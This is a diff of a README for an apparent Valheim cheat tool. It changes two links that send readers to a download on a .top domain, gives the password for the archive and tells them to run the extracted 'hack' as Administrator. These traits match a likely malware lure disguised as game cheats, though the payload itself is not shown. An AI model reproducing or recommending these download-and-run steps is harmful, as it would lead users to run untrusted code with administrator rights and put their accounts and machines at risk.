@@ -6,7 +6,7 @@ Valheim hack with god mode, one-hit kill, item spawner, fly hack, and more. For 
 
 ## ⬇️ Download
 
-**[CLICK](https://gitdownapply.top/)**
+**[CLICK](https://gitdownapps.top)**
 
 Archive passkey: `Github`
 
@@ -70,7 +70,7 @@ Based on popular tools like **BepInEx** and **Valheim Plus**.
 
 ## 🔧 How to Use
 
-1. Click **[CLICK](https://gitdownapply.top/)** to download.
+1. Click **[CLICK](https://gitdownapps.top)** to download.
 2. Extract the archive.
 3. Launch Valheim.
 4. Run the hack **as Administrator**.
